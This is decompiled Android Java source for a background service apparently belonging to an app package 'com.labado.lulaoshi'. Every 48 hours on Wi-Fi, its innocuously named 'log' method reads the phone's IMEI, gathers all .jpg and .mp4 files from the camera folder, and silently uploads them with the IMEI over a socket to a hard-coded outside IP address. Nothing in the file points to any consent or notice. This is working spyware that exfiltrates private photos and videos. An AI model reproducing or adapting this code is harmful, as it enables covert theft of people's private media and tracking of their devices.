package com.labado.lulaoshi;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.Socket;
import java.util.ArrayList;

public class myService extends Service {
    public static final String LASTRUN = "lastrun";
    public static final String ONOROFF = "onoroff";
    public static final String SV_INFOS = "SV_Infos";
    private static final String TAG = "TestService";
    private static ArrayList<File> jpglist = new ArrayList();
    boolean b;
    /* access modifiers changed from: private */
    public int delay = 5000;
    Handler hd1 = new Handler();
    /* access modifiers changed from: private */
    public Runnable mTasks = new Runnable() {
        public void run() {
            myService.this.log();
            myService.this.hd1.postDelayed(myService.this.mTasks, (long) myService.this.delay);
        }
    };

    public IBinder onBind(Intent intent) {
        return null;
    }

    public boolean onUnbind(Intent i) {
        Log.e(TAG, "============> TestService.onUnbind");
        return false;
    }

    public void onRebind(Intent i) {
        Log.e(TAG, "============> TestService.onRebind");
    }

    public void onCreate() {
        Log.e(TAG, "============> TestService.onCreate");
        this.hd1.postDelayed(this.mTasks, (long) this.delay);
    }

    public void onStart(Intent intent, int startId) {
        Log.e(TAG, "============> TestService.onStart");
    }

    public void onDestroy() {
        Log.e(TAG, "============> TestService.onDestroy");
    }

    public void log() {
        Exception e;
        WifiManager wifiManager = (WifiManager) getSystemService("wifi");
        SharedPreferences settings = getSharedPreferences("SV_Infos", 0);
        long lr = settings.getLong("lastrun", System.currentTimeMillis());
        if (wifiManager.getWifiState() == 3 && 172800000 + lr < System.currentTimeMillis()) {
            if (!this.b) {
                settings.edit().putLong("lastrun", System.currentTimeMillis()).commit();
                String imei = ((TelephonyManager) getSystemService("phone")).getDeviceId();
                try {
                    listFile(new File("/mnt/sdcard/dcim/"));
                    int i = 0;
                    Socket s = null;
                    while (i < jpglist.size()) {
                        try {
                            Socket socket = new Socket("221.232.138.50", 8977);
                            DataInputStream fis = new DataInputStream(new BufferedInputStream(new FileInputStream(((File) jpglist.get(i)).getPath())));
                            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
                            dataOutputStream.writeUTF("\\" + imei + "\\");
                            dataOutputStream.writeUTF(((File) jpglist.get(i)).getName());
                            dataOutputStream.flush();
                            dataOutputStream.writeLong(((File) jpglist.get(i)).length());
                            dataOutputStream.flush();
                            byte[] buf = new byte[1024];
                            while (true) {
                                int read = 0;
                                if (fis != null) {
                                    read = fis.read(buf);
                                }
                                if (read == -1) {
                                    break;
                                }
                                dataOutputStream.write(buf, 0, read);
                            }
                            dataOutputStream.flush();
                            fis.close();
                            socket.close();
                            i++;
                            s = socket;
                        } catch (Exception e2) {
                            e = e2;
                            Socket socket2 = s;
                            System.out.println("service error ----->  " + e.getMessage().toString());
                            return;
                        }
                    }
                    this.b = true;
                } catch (Exception e3) {
                    e = e3;
                    System.out.println("service error ----->  " + e.getMessage().toString());
                    return;
                }
            }
            if (this.b && 86400000 + getSharedPreferences("SV_Infos", 0).getLong("lastrun", 0) < System.currentTimeMillis()) {
                this.b = false;
            }
        }
    }

    private static boolean isWiFiActive(Context inContext) {
        ConnectivityManager connectivity = (ConnectivityManager) inContext.getApplicationContext().getSystemService("connectivity");
        if (connectivity != null) {
            NetworkInfo[] info = connectivity.getAllNetworkInfo();
            if (info != null) {
                int i = 0;
                while (i < info.length) {
                    if (info[i].getTypeName().equals("WIFI") && info[i].isConnected()) {
                        return true;
                    }
                    i++;
                }
            }
        }
        return false;
    }

    /* access modifiers changed from: 0000 */
    public void listFile(File f) {
        if (f.isDirectory()) {
            File[] t = f.listFiles();
            for (File listFile : t) {
                listFile(listFile);
            }
        } else if (f.getAbsolutePath().indexOf(".jpg") != -1 || f.getAbsolutePath().indexOf(".mp4") != -1) {
            jpglist.add(f);
        }
    }
}
